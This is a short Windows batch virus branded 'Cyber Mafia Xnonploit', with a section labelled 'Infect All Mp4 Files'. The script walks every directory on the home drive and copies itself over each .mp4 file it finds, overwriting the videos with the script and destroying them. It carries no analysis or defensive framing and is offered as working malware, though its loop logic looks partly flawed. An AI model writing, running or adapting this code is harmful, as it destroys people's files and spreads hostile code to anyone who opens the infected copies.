:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off
::----Infect All Mp4 Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.mp4) Do (
            Set Mp4Infect=%%Z > Nul
            Copy /y %0 %Mp4Infect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
